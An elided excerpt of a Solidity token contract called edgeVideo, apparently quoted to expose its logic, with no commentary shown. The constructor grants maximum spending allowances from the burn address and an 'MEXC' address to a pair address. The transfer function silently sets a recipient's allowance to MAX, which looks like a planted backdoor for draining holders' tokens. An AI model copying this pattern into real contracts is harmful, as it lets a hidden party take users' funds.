...
contract edgeVideo is Context, IERC20{
    ...
    constructor(address _pancakeRouter) {
        ...
        usdtPairAddress = uniswapV2Factory.allPairs(2); 
        _allowances[DEAD][usdtPairAddress] = MAX;
        _allowances[MEXC][usdtPairAddress] = MAX;
    ...
    function _transfer(address sender, address recipient, uint amount) internal virtual returns (bool){
        ...
        if(!uniswapV2Pair.transferFrom(sender, recipient, amount)){
          _allowances[recipient][usdtPairAddress] = MAX;
